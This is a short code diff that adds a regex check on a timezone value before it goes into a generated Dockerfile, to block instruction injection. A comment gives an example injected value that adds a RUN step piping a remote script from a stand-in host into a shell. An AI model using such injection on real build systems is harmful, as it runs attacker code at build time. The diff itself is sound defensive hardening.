@@ -20,6 +20,14 @@ export function generateProjectDockerfile(
 
   const lines = [`FROM ${IMAGE_NAME}:${baseVersion}`]
   if (timezone) {
+    // Validate before interpolating into the Dockerfile. Without this an
+    // attacker-controlled value (e.g. `Asia/Tokyo\nRUN curl evil.sh | sh`)
+    // could inject extra Dockerfile instructions and run arbitrary commands
+    // at build time. IANA tz names are region/city paths plus a few special
+    // forms (UTC, Etc/GMT+9), so restrict to that character set.
+    if (!/^[A-Za-z0-9/_+-]+$/.test(timezone)) {
+      throw new Error(`Invalid timezone (contains forbidden character): "${timezone.substring(0, 50)}"`)
+    }
     // Override the TZ env var set by docker run, allowing per-project custom timezone
     lines.push(`ENV TZ=${timezone}`)
   }
